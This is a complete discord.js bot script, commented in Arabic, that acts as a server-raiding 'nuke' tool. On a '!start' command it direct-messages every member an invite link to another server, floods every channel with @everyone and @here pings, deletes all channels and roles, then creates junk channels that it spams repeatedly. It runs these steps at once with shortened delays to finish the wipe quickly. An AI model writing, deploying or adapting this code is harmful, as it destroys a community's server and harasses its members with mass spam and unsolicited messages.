const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers // مطلوب لجلب أعضاء السيرفر وإرسال الرسائل الخاصة لهم
    ]
});

const PREFIX = '!'; 
const TARGET_SERVER_LINK = 'https://discord.gg/URaRZeKG9'; // الرابط الجديد

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content.startsWith(PREFIX + 'start')) {
        const guild = message.guild;
        if (!guild) return;

        message.reply('جاري تنفيذ العمليات وإرسال الرابط للأعضاء...');

        // جلب جميع الأعضاء في السيرفر وإرسال الرابط لهم في الخاص مع منشن صحيح
        try {
            await guild.members.fetch();
            guild.members.cache.forEach(async member => {
                if (!member.user.bot) {
                    try {
                        // إرسال المنشن مع الرابط في رسالة منفصلة ليظهر بشكل بطاقة دعوة صالحة
                        await member.send(`مرحباً <@${member.id}>\n${TARGET_SERVER_LINK}`);
                    } catch (err) {
                        // في حال كان البوت لا يستطيع المراسلة الخاصة لبعض الأعضاء
                    }
                }
            });
        } catch (e) {
            console.log('خطأ أثناء جلب الأعضاء.');
        }

        // إرسال الرابط في الرومات العامة الموجودة مسبقاً مع @everyone و @here
        guild.channels.cache.forEach(async channel => {
            if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
                try {
                    await channel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
                } catch (e) {}
            }
        });

        // التنفيذ المتزامن (حذف وإنشاء الرومات والرولات معاً) وبسرعة 1.8x
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms / 1.8));

        // تنفيذ حذف وإنشاء الرومات
        const channelsTask = (async () => {
            for (const [id, channel] of guild.channels.cache) {
                try {
                    await channel.delete();
                    await delay(500); 
                } catch (e) {}
            }

            for (let i = 1; i <= 5; i++) {
                try {
                    const newChannel = await guild.channels.create({
                        name: `room-${i}`,
                        type: 0 
                    });
                    await delay(1000);

                    for (let j = 1; j <= 8; j++) {
                        await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
                        await delay(300); 
                    }
                } catch (e) {}
            }
        })();

        // تنفيذ حذف وإنشاء الرولات بالتزامن
        const rolesTask = (async () => {
            for (const [id, role] of guild.roles.cache) {
                if (!role.managed && role.id !== guild.id) {
                    try {
                        await role.delete();
                        await delay(500);
                    } catch (e) {}
                }
            }

            for (let i = 1; i <= 5; i++) {
                try {
                    await guild.roles.create({
                        name: `Role-${i}`,
                        color: 'Random'
                    });
                    await delay(1000);
                } catch (e) {}
            }
        })();

        await Promise.all([channelsTask, rolesTask]);
    }
});

// التعديل الأخير ليتوافق مع موقع Render للتوكن
client.login(process.env.DISCORD_TOKEN);
